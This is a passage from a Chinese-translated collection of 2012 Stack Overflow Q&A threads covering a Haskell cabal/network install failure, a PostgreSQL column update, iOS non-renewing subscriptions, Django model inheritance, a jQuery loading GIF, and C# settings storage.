HTTP-4000.2.3 depends on network-2.3.1.0 which failed to install.
cabal-install-0.10.2 depends on network-2.3.1.0 which failed to install.
network-2.3.1.0 failed during the building phase. The exception was:
ExitFailure 1 
```

尝试`network`通过自己安装软件包会`cabal install network`产生完全相同的错误。

我试过

```
$ ghc-pkg check 
```

打印这个：

```
There are problems in package QuickCheck-2.5:
  import-dirs: /home/kenny/.cabal/lib/QuickCheck-2.5/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/QuickCheck-2.5/ghc-6.12.1 doesn't exist or isn't a directory
  file Test/QuickCheck/All.hi is missing
  file Test/QuickCheck/Function.hi is missing
  file Test/QuickCheck.hi is missing
  file Test/QuickCheck/Arbitrary.hi is missing
  file Test/QuickCheck/Gen.hi is missing
  file Test/QuickCheck/Monadic.hi is missing
  file Test/QuickCheck/Modifiers.hi is missing
  file Test/QuickCheck/Property.hi is missing
  file Test/QuickCheck/Test.hi is missing
  file Test/QuickCheck/Text.hi is missing
  file Test/QuickCheck/Poly.hi is missing
  file Test/QuickCheck/State.hi is missing
  file Test/QuickCheck/Exception.hi is missing
  cannot find libHSQuickCheck-2.5.a on library path
There are problems in package Chart-0.16:
  import-dirs: /home/kenny/.cabal/lib/Chart-0.16/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/Chart-0.16/ghc-6.12.1 doesn't exist or isn't a directory
  file Graphics/Rendering/Chart.hi is missing
  file Graphics/Rendering/Chart/Types.hi is missing
  file Graphics/Rendering/Chart/Renderable.hi is missing
  file Graphics/Rendering/Chart/Axis.hi is missing
  file Graphics/Rendering/Chart/Axis/Floating.hi is missing
  file Graphics/Rendering/Chart/Axis/Indexed.hi is missing
  file Graphics/Rendering/Chart/Axis/Int.hi is missing
  file Graphics/Rendering/Chart/Axis/LocalTime.hi is missing
  file Graphics/Rendering/Chart/Axis/Types.hi is missing
  file Graphics/Rendering/Chart/Axis/Unit.hi is missing
  file Graphics/Rendering/Chart/Layout.hi is missing
  file Graphics/Rendering/Chart/Legend.hi is missing
  file Graphics/Rendering/Chart/Simple.hi is missing
  file Graphics/Rendering/Chart/Simple/Internal.hi is missing
  file Graphics/Rendering/Chart/Grid.hi is missing
  file Graphics/Rendering/Chart/Plot.hi is missing
  file Graphics/Rendering/Chart/Plot/Types.hi is missing
  file Graphics/Rendering/Chart/Plot/Annotation.hi is missing
  file Graphics/Rendering/Chart/Plot/AreaSpots.hi is missing
  file Graphics/Rendering/Chart/Plot/Bars.hi is missing
  file Graphics/Rendering/Chart/Plot/Candle.hi is missing
  file Graphics/Rendering/Chart/Plot/ErrBars.hi is missing
  file Graphics/Rendering/Chart/Plot/FillBetween.hi is missing
  file Graphics/Rendering/Chart/Plot/Hidden.hi is missing
  file Graphics/Rendering/Chart/Plot/Lines.hi is missing
  file Graphics/Rendering/Chart/Plot/Pie.hi is missing
  file Graphics/Rendering/Chart/Plot/Points.hi is missing
  file Graphics/Rendering/Chart/SparkLine.hi is missing
  cannot find libHSChart-0.16.a on library path
There are problems in package data-accessor-template-0.2.1.9:
  import-dirs: /home/kenny/.cabal/lib/data-accessor-template-0.2.1.9/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/data-accessor-template-0.2.1.9/ghc-6.12.1 doesn't exist or isn't a directory
  file Data/Accessor/Template.hi is missing
  file Data/Accessor/Template/Example.hi is missing
  cannot find libHSdata-accessor-template-0.2.1.9.a on library path
There are problems in package utility-ht-0.0.8:
  import-dirs: /home/kenny/.cabal/lib/utility-ht-0.0.8/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/utility-ht-0.0.8/ghc-6.12.1 doesn't exist or isn't a directory
  file Data/Bool/HT.hi is missing
  file Data/Eq/HT.hi is missing
  file Data/Function/HT.hi is missing
  file Data/Ix/Enum.hi is missing
  file Data/List/HT.hi is missing
  file Data/List/Key.hi is missing
  file Data/List/Match.hi is missing
  file Data/Maybe/HT.hi is missing
  file Data/Monoid/HT.hi is missing
  file Data/Ord/HT.hi is missing
  file Data/Record/HT.hi is missing
  file Data/String/HT.hi is missing
  file Data/Tuple/HT.hi is missing
  file Control/Monad/HT.hi is missing
  file Control/Functor/HT.hi is missing
  file Data/Strictness/HT.hi is missing
  file Text/Read/HT.hi is missing
  file Text/Show/HT.hi is missing
  file Data/Bool/HT/Private.hi is missing
  file Data/List/HT/Private.hi is missing
  file Data/List/Key/Private.hi is missing
  file Data/List/Match/Private.hi is missing
  file Data/Function/HT/Private.hi is missing
  file Data/Record/HT/Private.hi is missing
  cannot find libHSutility-ht-0.0.8.a on library path
There are problems in package data-accessor-0.2.2.2:
  import-dirs: /home/kenny/.cabal/lib/data-accessor-0.2.2.2/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/data-accessor-0.2.2.2/ghc-6.12.1 doesn't exist or isn't a directory
  file Data/Accessor.hi is missing
  file Data/Accessor/Basic.hi is missing
  file Data/Accessor/Container.hi is missing
  file Data/Accessor/Show.hi is missing
  file Data/Accessor/Tuple.hi is missing
  file Data/Accessor/BinaryRead.hi is missing
  file Data/Accessor/MonadState.hi is missing
  file Data/Accessor/Example.hi is missing
  file Data/Accessor/Private.hi is missing
  file Data/Accessor/MonadStatePrivate.hi is missing
  cannot find libHSdata-accessor-0.2.2.2.a on library path
There are problems in package mtl-2.1.2:
  import-dirs: /home/kenny/.cabal/lib/mtl-2.1.2/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/mtl-2.1.2/ghc-6.12.1 doesn't exist or isn't a directory
  file Control/Monad/Cont.hi is missing
  file Control/Monad/Cont/Class.hi is missing
  file Control/Monad/Error.hi is missing
  file Control/Monad/Error/Class.hi is missing
  file Control/Monad/Identity.hi is missing
  file Control/Monad/List.hi is missing
  file Control/Monad/RWS.hi is missing
  file Control/Monad/RWS/Class.hi is missing
  file Control/Monad/RWS/Lazy.hi is missing
  file Control/Monad/RWS/Strict.hi is missing
  file Control/Monad/Reader.hi is missing
  file Control/Monad/Reader/Class.hi is missing
  file Control/Monad/State.hi is missing
  file Control/Monad/State/Class.hi is missing
  file Control/Monad/State/Lazy.hi is missing
  file Control/Monad/State/Strict.hi is missing
  file Control/Monad/Trans.hi is missing
  file Control/Monad/Writer.hi is missing
  file Control/Monad/Writer/Class.hi is missing
  file Control/Monad/Writer/Lazy.hi is missing
  file Control/Monad/Writer/Strict.hi is missing
  cannot find libHSmtl-2.1.2.a on library path
There are problems in package transformers-0.3.0.0:
  import-dirs: /home/kenny/.cabal/lib/transformers-0.3.0.0/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/transformers-0.3.0.0/ghc-6.12.1 doesn't exist or isn't a directory
  file Control/Applicative/Backwards.hi is missing
  file Control/Applicative/Lift.hi is missing
  file Control/Monad/IO/Class.hi is missing
  file Control/Monad/Trans/Class.hi is missing
  file Control/Monad/Trans/Cont.hi is missing
  file Control/Monad/Trans/Error.hi is missing
  file Control/Monad/Trans/Identity.hi is missing
  file Control/Monad/Trans/List.hi is missing
  file Control/Monad/Trans/Maybe.hi is missing
  file Control/Monad/Trans/Reader.hi is missing
  file Control/Monad/Trans/RWS.hi is missing
  file Control/Monad/Trans/RWS/Lazy.hi is missing
  file Control/Monad/Trans/RWS/Strict.hi is missing
  file Control/Monad/Trans/State.hi is missing
  file Control/Monad/Trans/State/Lazy.hi is missing
  file Control/Monad/Trans/State/Strict.hi is missing
  file Control/Monad/Trans/Writer.hi is missing
  file Control/Monad/Trans/Writer/Lazy.hi is missing
  file Control/Monad/Trans/Writer/Strict.hi is missing
  file Data/Functor/Compose.hi is missing
  file Data/Functor/Constant.hi is missing
  file Data/Functor/Identity.hi is missing
  file Data/Functor/Product.hi is missing
  file Data/Functor/Reverse.hi is missing
  cannot find libHStransformers-0.3.0.0.a on library path
There are problems in package Cabal-1.14.0:
  import-dirs: /home/kenny/.cabal/lib/Cabal-1.14.0/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/Cabal-1.14.0/ghc-6.12.1 doesn't exist or isn't a directory
  file Distribution/Compiler.hi is missing
  file Distribution/InstalledPackageInfo.hi is missing
  file Distribution/License.hi is missing
  file Distribution/Make.hi is missing
  file Distribution/ModuleName.hi is missing
  file Distribution/Package.hi is missing
  file Distribution/PackageDescription.hi is missing
  file Distribution/PackageDescription/Configuration.hi is missing
  file Distribution/PackageDescription/Parse.hi is missing
  file Distribution/PackageDescription/Check.hi is missing
  file Distribution/PackageDescription/PrettyPrint.hi is missing
  file Distribution/ParseUtils.hi is missing
  file Distribution/ReadE.hi is missing
  file Distribution/Simple.hi is missing
  file Distribution/Simple/Build.hi is missing
  file Distribution/Simple/Build/Macros.hi is missing
  file Distribution/Simple/Build/PathsModule.hi is missing
  file Distribution/Simple/BuildPaths.hi is missing
  file Distribution/Simple/Bench.hi is missing
  file Distribution/Simple/Command.hi is missing
  file Distribution/Simple/Compiler.hi is missing
  file Distribution/Simple/Configure.hi is missing
  file Distribution/Simple/GHC.hi is missing
  file Distribution/Simple/LHC.hi is missing
  file Distribution/Simple/Haddock.hi is missing
  file Distribution/Simple/Hpc.hi is missing
  file Distribution/Simple/Hugs.hi is missing
  file Distribution/Simple/Install.hi is missing
  file Distribution/Simple/InstallDirs.hi is missing
  file Distribution/Simple/JHC.hi is missing
  file Distribution/Simple/LocalBuildInfo.hi is missing
  file Distribution/Simple/NHC.hi is missing
  file Distribution/Simple/PackageIndex.hi is missing
  file Distribution/Simple/PreProcess.hi is missing
  file Distribution/Simple/PreProcess/Unlit.hi is missing
  file Distribution/Simple/Program.hi is missing
  file Distribution/Simple/Program/Ar.hi is missing
  file Distribution/Simple/Program/Builtin.hi is missing
  file Distribution/Simple/Program/Db.hi is missing
  file Distribution/Simple/Program/HcPkg.hi is missing
  file Distribution/Simple/Program/Hpc.hi is missing
  file Distribution/Simple/Program/Ld.hi is missing
  file Distribution/Simple/Program/Run.hi is missing
  file Distribution/Simple/Program/Script.hi is missing
  file Distribution/Simple/Program/Types.hi is missing
  file Distribution/Simple/Register.hi is missing
  file Distribution/Simple/Setup.hi is missing
  file Distribution/Simple/SrcDist.hi is missing
  file Distribution/Simple/Test.hi is missing
  file Distribution/Simple/UHC.hi is missing
  file Distribution/Simple/UserHooks.hi is missing
  file Distribution/Simple/Utils.hi is missing
  file Distribution/System.hi is missing
  file Distribution/TestSuite.hi is missing
  file Distribution/Text.hi is missing
  file Distribution/Verbosity.hi is missing
  file Distribution/Version.hi is missing
  file Distribution/Compat/ReadP.hi is missing
  file Language/Haskell/Extension.hi is missing
  file Distribution/GetOpt.hi is missing
  file Distribution/Compat/Exception.hi is missing
  file Distribution/Compat/CopyFile.hi is missing
  file Distribution/Compat/TempFile.hi is missing
  file Distribution/Simple/GHC/IPI641.hi is missing
  file Distribution/Simple/GHC/IPI642.hi is missing
  file Paths_Cabal.hi is missing
  cannot find libHSCabal-1.14.0.a on library path
There are problems in package zlib-0.5.3.3:
  import-dirs: /home/kenny/.cabal/lib/zlib-0.5.3.3/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/zlib-0.5.3.3/ghc-6.12.1 doesn't exist or isn't a directory
  file Codec/Compression/GZip.hi is missing
  file Codec/Compression/Zlib.hi is missing
  file Codec/Compression/Zlib/Raw.hi is missing
  file Codec/Compression/Zlib/Internal.hi is missing
  file Codec/Compression/Zlib/Stream.hi is missing
  cannot find libHSzlib-0.5.3.3.a on library path
There are problems in package colour-2.3.3:
  import-dirs: /home/kenny/.cabal/lib/colour-2.3.3/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/colour-2.3.3/ghc-6.12.1 doesn't exist or isn't a directory
  file Data/Colour.hi is missing
  file Data/Colour/SRGB.hi is missing
  file Data/Colour/SRGB/Linear.hi is missing
  file Data/Colour/CIE.hi is missing
  file Data/Colour/CIE/Illuminant.hi is missing
  file Data/Colour/RGBSpace.hi is missing
  file Data/Colour/RGBSpace/HSL.hi is missing
  file Data/Colour/RGBSpace/HSV.hi is missing
  file Data/Colour/Names.hi is missing
  file Data/Colour/Internal.hi is missing
  file Data/Colour/Chan.hi is missing
  file Data/Colour/RGB.hi is missing
  file Data/Colour/Matrix.hi is missing
  file Data/Colour/CIE/Chromaticity.hi is missing
  cannot find libHScolour-2.3.3.a on library path
There are problems in package Cabal-1.10.2.0:
  import-dirs: /home/kenny/.cabal/lib/Cabal-1.10.2.0/ghc-6.12.1 doesn't exist or isn't a directory
  library-dirs: /home/kenny/.cabal/lib/Cabal-1.10.2.0/ghc-6.12.1 doesn't exist or isn't a directory
  file Distribution/Compiler.hi is missing
  file Distribution/InstalledPackageInfo.hi is missing
  file Distribution/License.hi is missing
  file Distribution/Make.hi is missing
  file Distribution/ModuleName.hi is missing
  file Distribution/Package.hi is missing
  file Distribution/PackageDescription.hi is missing
  file Distribution/PackageDescription/Configuration.hi is missing
  file Distribution/PackageDescription/Parse.hi is missing
  file Distribution/PackageDescription/Check.hi is missing
  file Distribution/ParseUtils.hi is missing
  file Distribution/ReadE.hi is missing
  file Distribution/Simple.hi is missing
  file Distribution/Simple/Build.hi is missing
  file Distribution/Simple/Build/Macros.hi is missing
  file Distribution/Simple/Build/PathsModule.hi is missing
  file Distribution/Simple/BuildPaths.hi is missing
  file Distribution/Simple/Command.hi is missing
  file Distribution/Simple/Compiler.hi is missing
  file Distribution/Simple/Configure.hi is missing
  file Distribution/Simple/GHC.hi is missing
  file Distribution/Simple/LHC.hi is missing
  file Distribution/Simple/Haddock.hi is missing
  file Distribution/Simple/Hugs.hi is missing
  file Distribution/Simple/Install.hi is missing
  file Distribution/Simple/InstallDirs.hi is missing
  file Distribution/Simple/JHC.hi is missing
  file Distribution/Simple/LocalBuildInfo.hi is missing
  file Distribution/Simple/NHC.hi is missing
  file Distribution/Simple/PackageIndex.hi is missing
  file Distribution/Simple/PreProcess.hi is missing
  file Distribution/Simple/PreProcess/Unlit.hi is missing
  file Distribution/Simple/Program.hi is missing
  file Distribution/Simple/Program/Ar.hi is missing
  file Distribution/Simple/Program/Builtin.hi is missing
  file Distribution/Simple/Program/Db.hi is missing
  file Distribution/Simple/Program/HcPkg.hi is missing
  file Distribution/Simple/Program/Ld.hi is missing
  file Distribution/Simple/Program/Run.hi is missing
  file Distribution/Simple/Program/Script.hi is missing
  file Distribution/Simple/Program/Types.hi is missing
  file Distribution/Simple/Register.hi is missing
  file Distribution/Simple/Setup.hi is missing
  file Distribution/Simple/SrcDist.hi is missing
  file Distribution/Simple/Test.hi is missing
  file Distribution/Simple/UHC.hi is missing
  file Distribution/Simple/UserHooks.hi is missing
  file Distribution/Simple/Utils.hi is missing
  file Distribution/System.hi is missing
  file Distribution/TestSuite.hi is missing
  file Distribution/Text.hi is missing
  file Distribution/Verbosity.hi is missing
  file Distribution/Version.hi is missing
  file Distribution/Compat/ReadP.hi is missing
  file Language/Haskell/Extension.hi is missing
  file Distribution/GetOpt.hi is missing
  file Distribution/Compat/Exception.hi is missing
  file Distribution/Compat/CopyFile.hi is missing
  file Distribution/Compat/TempFile.hi is missing
  file Distribution/Simple/GHC/IPI641.hi is missing
  file Distribution/Simple/GHC/IPI642.hi is missing
  file Paths_Cabal.hi is missing
  cannot find libHSCabal-1.10.2.0.a on library path

The following packages are broken, either because they have a problem
listed above, or because they depend on a broken package.
QuickCheck-2.5
Chart-0.16
data-accessor-template-0.2.1.9
utility-ht-0.0.8
data-accessor-0.2.2.2
mtl-2.1.2
transformers-0.3.0.0
Cabal-1.14.0
zlib-0.5.3.3
colour-2.3.3
Cabal-1.10.2.0 
```

我重新安装了上面提到的所有软件包`cabal install --reinstall $PACKAGE`。在此之后，**除了**Cabal-1.10.2.0之外`ghc-pkg check`不再产生错误。我觉得很奇怪的是

 **```
$ cabal install --reinstall Cabal 
```

尝试安装 Cabal-1.14.0，这似乎工作正常，但`ghc-pkg check`仍然抱怨缺少或损坏的 Cabal-1.10.2.0。

关于网络包安装不成功的堆栈跟踪在我看来好像网络包本身没有正确构建（似乎有编译错误？）。

我也使用 sudo 尝试了整个过程，但没有任何区别。我还发现[cabal-install-0.10.2 在构建阶段失败，](https://stackoverflow.com/questions/6590321/cabal-install-0-10-2-failed-during-the-building-phase)它处理类似的神秘“无法安装包”错误，但问题似乎并没有真正解决。

我在这里做什么？目前，对我来说，它看起来像是一个非常糟糕的阴谋集团。对此我有什么可以做的，或者我应该忘记它并从 Haskell 网站下载 Haskell 平台？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T07:48:20.957

最简单的解决方案是从头开始升级，从 GHC 开始。版本 6.12 是*旧的*。但是，如果由于某种原因您不能或不想升级 GHC，这里有一些旨在帮助您解决每个问题的提示。

> cabal：需要 alex，但找不到。

你的本能`cabal install alex`是正确的反应。

> ghc：无法识别的标志：-rtsopts

看起来你有一个老式的 GHC；该`-rtsopts`标志是在 GHC 7 中添加的（我在您的问题后面看到您正在运行 6.12）。您可能应该尝试安装 alex 的旧版本——也许是 6.12 的同时代版本，它是在 2.5 年前左右发布的。或者，如果您认为它仍应支持 GHC6，请向 alex 维护者投诉。另一种选择是尝试自己修复它；`.cabal`查看与 alex 捆绑的文件，看看是否只是删除`-rtsopts`标志可以让事情继续下去。

> 无法将预期类型“Char”与推断类型“[Char]”匹配

不太确定这一点，但听起来`network`' 的依赖项的版本界限不够严格。同样，一种解决方案是尝试安装较旧版本的网络，另一种解决方案是尝试通过更改`network`'s`.cabal`文件自行修复它。老实说，这听起来像是你谈论的所有问题中最难解决的问题。

`notFollowedBy`（编辑添加:) 根据关于#haskell 的一些讨论， parsec-2 和 parsec-3 之间的类型似乎发生了变化。因此，这可能就像将网络的 cabal 文件中的依赖项提高到 parsec >= 3 而不是 >= 2 一样简单。

> 但`ghc-pkg check`仍然不断抱怨缺少或损坏的 Cabal-1.10.2.0

GHC 能够跟踪单个库的多个版本，因此安装新版本`Cabal`不会修复旧版本。您可以要求 cabal-install 重新安装特定版本以尝试修复此问题；例如

```
cabal install --reinstall Cabal-1.10.2.0 
```**

# sql - 在临时表中添加新列

> ID：12068056
> 
> 赞同：2
> 
> 时间：2012-08-22T07:16:37.850
> 
> 标签：sql, postgresql

我在 PostgreSQL 函数中有一个临时表，我想插入一个新`VARCHAR`列。它应该有一个值，该值取决于表的另一列，名为“金额”。

当金额为正时，我希望将列行的值记入贷方，而当值为负数时，应将列记入借方。

我还有一个要求：我想将金额列的值四舍五入为 2 位十进制数字

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T07:26:07.410

你想跟[`ALTER TABLE ... ADD COLUMN`](http://www.postgresql.org/docs/current/static/sql-altertable.html)一个`UPDATE`.

我最初说过`ALTER TABLE ... ADD COLUMN ... USING`，但这在两个方面是错误的。`ADD COLUMN`取一个`DEFAULT`not `USING`- 并且您不能一次完成，因为`DEFAULT`表达式和`USING`表达式都不能引用其他列。

所以你必须这样做：

```
 ALTER TABLE tablename ADD COLUMN colname varchar;
 UPDATE tablename SET colname = ( CASE WHEN othercol < 0 THEN 'Credit' ELSE 'Debit' END ); 
```

仔细考虑零应该是“借方”还是“贷方”，并`CASE`相应地调整。

对于舍入，使用[`round(amount,2)`](http://www.postgresql.org/docs/current/static/functions-math.html). 您的问题中没有足够的细节让我确定如何；可能通过`UPDATE`使用但没有上下文的临时表，`UPDATE thetable SET amount = round(amount,2)`很难知道这是否正确。**该语句不可逆转地丢弃信息，**因此它只能用于数据的副本。

# ios - 用户可以购买多个非续订 Apple 订阅以延长其到期日期吗？

> ID：12068073
> 
> 赞同：4
> 
> 时间：2012-08-22T07:17:40.970
> 
> 标签：ios, in-app-purchase, subscriptions

在自动续订订阅系统中，用户不能多次购买订阅。你最终会收到一条消息，上面写着“你已经订阅了”。但是，对于非续订订阅，我的理解是，如何处理它完全取决于我们自己。

因此，假设我们的订阅期限为一年。如果用户购买了订阅，并且 6 个月后（即使他/她还有 6 个月的剩余时间）决定购买另一个订阅，我们是否应该：

1.  允许这样做，并在他/她当前的到期日期之上增加一年，或
2.  不允许使用我们自己的“您已订阅”消息

他们的文档非常清楚地表明，在不可更新订阅的情况下，实施完全取决于我们，但我找不到这些实施的任何规则。上面的选项 1) 是否允许，或者我们应该效仿带有选项 2) 的自动更新系统？

**编辑**：我想问这个问题的主要问题和原因是，如果我们允许多次购买，并说我们有一些疯狂的人购买了 50 个订阅（50 年），并且我们在 50 年结束之前停止了我们的服务—— - 怎么了？这不是一个非常现实的例子，但无论如何我们都需要考虑这种情况。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-02T07:02:00.750

是的。
我的应用使用非续订订阅，如果用户购买了两次为期 1 个月的订阅，iOS 将允许它，而我已选择允许它。在这种情况下，我只是将持续时间加在一起，给用户 2 个月。通常，iOS 会弹出一个警报（下图），告诉用户“您已经购买了此订阅。点击购买以续订或延长它。”

![多个应用内购买提醒](../Images/3f825f752cc23eabc3f2844554d94c7f.png)

我认为限制订阅的累积长度是个好主意。您必须在您的服务器上检查他们的帐户，然后在应用程序中隐藏或禁用购买按钮，因为一旦用户开始购买，我很确定您不能从您的服务器中断或取消它。

# python - Django多表继承与单独（相同）表没有指针

> ID：12068077
> 
> 赞同：5
> 
> 时间：2012-08-22T07:17:57.927
> 
> 标签：python, django, database, django-models

我正在继承现有模型（完全来自另一个应用程序）并希望我的模型拥有自己的数据库表。原始表的相同克隆/副本，而不仅仅是带有指向“父”表中存储的数据的指针的表。

这是我的模型：

```
class A (models.Model):
    name = models.CharField('name')

class MyA (A):
    class Meta:
        db_table = 'My_A' 
```

这是我的数据库表：

```
CREATE TABLE A
(
  id serial NOT NULL,
  "name" character varying(50) NOT NULL,
  ...
)

CREATE TABLE My_A
(
  A_ptr_id integer NOT NULL,
  ...
) 
```

这就是我想要的：

```
CREATE TABLE A
(
  id serial NOT NULL,
  "name" character varying(50) NOT NULL,
  ...
)

CREATE TABLE My_A
(
  id serial NOT NULL,
  "name" character varying(50) NOT NULL,
  ...
) 
```

**编辑**：我最终复制粘贴了第 3 方模型

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2019-06-12T01:36:08.223

如果我对您的理解正确，您可以创建一个没有自己的表的抽象基类。然后，您可以从那里创建多个从具有自己的表的基类继承的类。

```
class ABase(models.Model):
    name = models.CharField('name')
    class Meta:
        abstract = True

class A(ABase):
    class Meta:
        db_table = 'A'

class MyA(ABase):
    class Meta:
        db_table = 'My_A' 
```

[Django 2.2 文档 - 抽象基类](https://docs.djangoproject.com/en/2.2/topics/db/models/#abstract-base-classes)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T09:13:34.503

新方法（如果您坚持分离数据）：创建模型 MyA 而不从 A 继承，并创建另一个模型 MergeA，该模型为 My 和 A 创建显式通用外键。但这肯定需要相当多的额外编码。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-22T07:33:14.523

当您继承 Django 模型时，它总是会生成与父模型的隐含 1-1 关系。Django 只会为您继承的模型生成字段。总的来说，这对我来说完全有意义。但是对于您的用例来说很麻烦。由于我们正在讨论 Django 核心功能，因此可能很难解决。您可以尝试将您的第 3 方模型作为代理模型复制并粘贴到您的代码中并从那里继承。

更新：但是为什么要将数据分成不同的表？最终目标是什么？

# jquery - 在gridview之前加载GIF图像

> ID：12068078
> 
> 赞同：0
> 
> 时间：2012-08-22T07:17:59.097
> 
> 标签：jquery, css

我正在从数据库中搜索记录，在将记录加载到 gridview 之前，我想显示一些加载 gif，加载后它应该淡出

```
 <div id="dvLoading"></div>
     <head runat="server">
   <script type="text/javascript">
$(window).load(function(){
  $('#dvLoading').fadeOut(2000);
});
</script> 
```

我的样式表

```
 #dvLoading
{
   background:#000 url(NewFolder1/loading-1.gif) no-repeat center center;
   height: 100px;
   width: 100px;
   position: fixed;
   z-index: 1000;
   left: 50%;
   top: 50%;
   margin: -25px 0 0 -25px;
} 
```

但是当我进行搜索时图像没有加载，如何让它出现和消失？

我的 HTML

```
 <html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">

   <script type="text/javascript">
  $('#dvLoading').fadeOut(2000);
</script>

</head>
<body>

<div id="dvLoading"></div>
<form id="form1" runat="server">
<div >

    <br />
    <asp:TextBox ID="TextBox1" runat="server"></asp:TextBox>
    <br />
    <br />
    <asp:TextBox ID="TextBox2" runat="server"></asp:TextBox>
    <br />
    <br />
    <asp:Button ID="Button1" runat="server" onclick="Button1_Click" Text="Button" />
    <br />
    <br />
    <br />
    <br />

    <asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
        BackColor="#DEBA84" BorderColor="#DEBA84" BorderStyle="None" BorderWidth="1px" 
        CellPadding="3" CellSpacing="2">
        <RowStyle BackColor="#FFF7E7" ForeColor="#8C4510" />
    <Columns>
    <asp:TemplateField HeaderText="Firstname">
    <ItemTemplate>
     <%# Eval("FirstName") %>
    </ItemTemplate>
    </asp:TemplateField>
   <asp:TemplateField HeaderText="Lastname">
    </asp:TemplateField>
   <asp:TemplateField HeaderText="Gender">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Marital status">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Height">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Complexion">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Religion">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="State">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Mother tongue">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Education">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Occupation">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Annual income">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="emailid">
     <ItemTemplate>
     <%# Eval("EmailID") %>
     </ItemTemplate>
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Star sign">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Rassi">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Gothram">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="DOB">
    </asp:TemplateField>
     <asp:TemplateField HeaderText="Time of birth">
    </asp:TemplateField>

    </Columns>
        <FooterStyle BackColor="#F7DFB5" ForeColor="#8C4510" />
        <PagerStyle ForeColor="#8C4510" HorizontalAlign="Center" />
        <SelectedRowStyle BackColor="#738A9C" Font-Bold="True" ForeColor="White" />
        <HeaderStyle BackColor="#A55129" Font-Bold="True" ForeColor="White" />
    </asp:GridView>

   </div>
    </form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:25:48.920

就用这个

```
<script type="text/javascript">
 $('#dvLoading').fadeOut(2000);
</script> 
```

[工作演示](http://jsfiddle.net/uEFcA/)

**编辑**

```
$('#form1').hide();
$('#dvLoading').fadeOut(2000);
$('#form1').show(2500); 
```

# c# - 存储和检索应用程序设置的正确方法是什么？

> ID：12068080
> 
> 赞同：4
> 
> 时间：2012-08-22T07:18:08.207
> 
> 标签：c#, settings, storage, appsettings

我主要是 C# .NET 4.0 开发人员，现在我正在重新考虑过去存储和检索应用程序设置的方法。

过去，我使用过多种方法，从带有制表符分隔键/值的简单“平面”文本文件到分层 XML 文件，以及介于两者之间的其他一些方法。我过去使用过（并且正在考虑再次使用）内置的 App.Config/AppSettings 类，但是没有任何内置方法可以保存您从该源加载的数据（我可以进入我在这样做时遇到的困难，但这不是问题的重点）。

这里的重点是，所有这些方法都有其缺点，虽然有些方法比其他方法效果更好，但有些方法比其他方法更易于使用，我正在努力确定一些一致且可靠的方法。

我的问题可能有一些有效的答案，所以我将被迫选择最好的答案，是这样的：如果任何内置框架会“你”推荐用于保存和加载数据进出设置怎么办？可执行文件附带的文件，或者如果不是内置框架，您会推荐什么标准？XML？“平面”文件？独立数据库？

假设配置本身不会那么大，并且将从数据库中读取任何实际数量的数据（或使用其他一些技术）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:24:05.740

虽然我是一个注册表迷，并且宁愿在那里有我的设置，但在我的 c# 应用程序中，我使用了内置的设置 - 所以在项目属性下，您可以定义负载及其默认值，然后使用

```
Properties.Settings.Default.<settingname> 
```

也可以设置它们，所以`Properties.Settings.Default.HideDisabled = true;`

你可以用

```
Properties.Settings.Default.Save(); 
```

我对此没有任何问题，但是，正如您所说，一切都有优点和缺点。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:28:17.377

只是另一种方式（kernel32），它与 C# 甚至 C# 4.0 无关，但是当我们开始列出变体时，它必须在这里有效

```
namespace Ini {
    public class IniFile {
        private string path;
        [DllImport("kernel32")]
        private static extern long WritePrivateProfileString(string section,
            string key, string val, string filePath);
        [DllImport("kernel32")]
        private static extern int GetPrivateProfileString(string section,
                    string key, string def, StringBuilder retVal,
            int size, string filePath);
        public IniFile(string INIPath) {
            path = INIPath;
            }
        public void IniWriteValue(string Section, string Key, string Value) {
            WritePrivateProfileString(Section, Key, Value, this.path);
            }
        public string IniReadValue(string Section, string Key) {
            StringBuilder temp = new StringBuilder(255);
            int i = GetPrivateProfileString(Section, Key, "", temp,
                                            255, this.path);
            return temp.ToString();
            }
        }
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T07:28:59.340

我处理过的一些应用程序涉及本地数据库，我们也使用该数据库文件来保存我们的设置。它可以工作，但是感觉有点不对劲，如果您希望在应用程序未运行时能够修改设置，这可能是个问题。（绕过崩溃或类似的事情。）

